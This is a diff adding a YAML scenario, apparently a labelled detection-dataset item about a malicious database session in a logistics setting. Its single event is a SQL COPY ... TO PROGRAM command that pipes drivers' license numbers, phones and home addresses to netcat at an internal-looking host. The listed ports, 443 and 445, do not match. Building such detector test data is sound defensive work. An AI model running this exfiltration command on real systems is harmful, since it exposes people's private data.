@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_84_copy_to_program_mal_2389m
+family_id: gen_logistics_84_copy_to_program_fam_2389
+domain: logistics
+time_of_day: '23:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT license_number, phone, home_address FROM drivers) TO PROGRAM
+      'nc etl-internal.corp 443'
+    connects_to:
+      ip: 10.11.32.78
+      port: 445
+matched_pair_id: gen_logistics_84_copy_to_program_pair_2389
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
